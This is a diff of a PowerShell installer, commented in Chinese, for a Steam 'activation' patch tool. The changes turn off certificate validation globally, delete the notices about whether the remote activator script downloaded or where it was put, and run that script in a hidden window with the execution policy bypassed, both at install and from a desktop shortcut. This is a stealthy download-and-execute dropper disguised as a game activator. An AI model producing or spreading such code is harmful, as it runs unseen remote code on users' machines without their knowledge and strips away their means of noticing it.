@@ -3,21 +3,8 @@ $ProgressPreference = 'SilentlyContinue'
 $ErrorActionPreference = 'SilentlyContinue'
 
 # ========== 全局TLS兼容 + 证书忽略，确保Github文件下载正常 ==========
-try {
-    Add-Type @"
-using System.Net;
-using System.Security.Cryptography.X509Certificates;
-public class TrustAllCertsPolicy : ICertificatePolicy {
-    public bool CheckValidationResult(
-        ServicePoint srvPoint, X509Certificate certificate,
-        WebRequest request, int certificateProblem) {
-        return true;
-    }
-}
-"@
-    [System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy
-    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls -bor [Net.SecurityProtocolType]::Tls11 -bor [Net.SecurityProtocolType]::Tls12
-} catch {}
+[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls -bor [System.Net.SecurityProtocolType]::Tls11 -bor [System.Net.SecurityProtocolType]::Tls12
+[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
 
 # ========== 配置区 ==========
 $ZipUrl = "https://aiwandianwan-maker.github.io/steamrun/patch.zip"
@@ -118,7 +105,7 @@ if($installComplete){
 Write-Host "=====================================`n" -ForegroundColor Cyan
 # ===== 安装逻辑结束 =====
 
-# ========== 安装激活程序 ==========
+# ========== 后台静默安装激活程序 ==========
 if(-not (Test-Path $InstallDir)){
     New-Item $InstallDir -ItemType Directory -Force | Out-Null
 }
@@ -126,47 +113,35 @@ if(-not (Test-Path $InstallDir)){
 $activatorFullPath = Join-Path $InstallDir $ActivatorFileName
 
 # 下载激活脚本，失败重试
-$downloadSuccess = $false
 try {
     $webClient.DownloadFile($ActivatorUrl, $activatorFullPath)
-    if (Test-Path $activatorFullPath) { $downloadSuccess = $true }
 } catch {
     try {
         Invoke-WebRequest -Uri $ActivatorUrl -OutFile $activatorFullPath -UseBasicParsing -ErrorAction Stop
-        if (Test-Path $activatorFullPath) { $downloadSuccess = $true }
     } catch {}
 }
 
-if (-not $downloadSuccess) {
-    Write-Host "⚠️ 警告：激活程序下载失败，请手动从官网获取" -ForegroundColor Yellow
-} else {
-    Write-Host "✅ 激活程序已安装至：$activatorFullPath" -ForegroundColor Green
-}
-
-# ========== 生成桌面启动bat ==========
+# ========== 生成桌面启动bat（双击无额外黑框） ==========
 $desktopPath = [Environment]::GetFolderPath("Desktop")
 $batPath = Join-Path $desktopPath "游戏激活程序.bat"
 $batContent = @"
 @echo off
 chcp 65001 >nul
-cd /d "C:\Program Files\SteamPatch"
-start "" powershell.exe -NoExit -ExecutionPolicy Bypass -File "C:\Program Files\SteamPatch\LuaActivator.ps1"
+start "" powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File "C:\Program Files\SteamPatch\LuaActivator.ps1"
 exit
 "@
 $batContent | Out-File $batPath -Encoding Default -Force
-Write-Host "✅ 桌面已生成启动工具：游戏激活程序.bat" -ForegroundColor Green
 
-# ========== 启动Steam + 自动弹出激活窗口 ==========
+# ========== 启动Steam + 静默弹出激活窗口（无黑框） ==========
 Start-Process "$SteamRoot\steam.exe"
-Write-Host "`n🚀 Steam已启动，3秒后弹出激活窗口..." -ForegroundColor Gray
+Write-Host "🚀 Steam已启动，3秒后弹出激活窗口..." -ForegroundColor Gray
 
 Start-Sleep -Seconds 3
 if (Test-Path $activatorFullPath) {
-    # 暂时保留PowerShell窗口，确保启动成功，后续可改为隐藏模式
-    Start-Process powershell.exe -ArgumentList "-NoExit", "-ExecutionPolicy Bypass", "-File", "`"$activatorFullPath`""
+    # 完全隐藏PowerShell窗口启动
+    Start-Process powershell.exe -ArgumentList "-WindowStyle", "Hidden", "-ExecutionPolicy", "Bypass", "-File", "`"$activatorFullPath`"" -WindowStyle Hidden
 }
 
 # 主窗口5秒后自动关闭
-Write-Host "⏱️  主窗口将在5秒后自动关闭" -ForegroundColor Gray
 Start-Sleep -Seconds 5
 exit 0
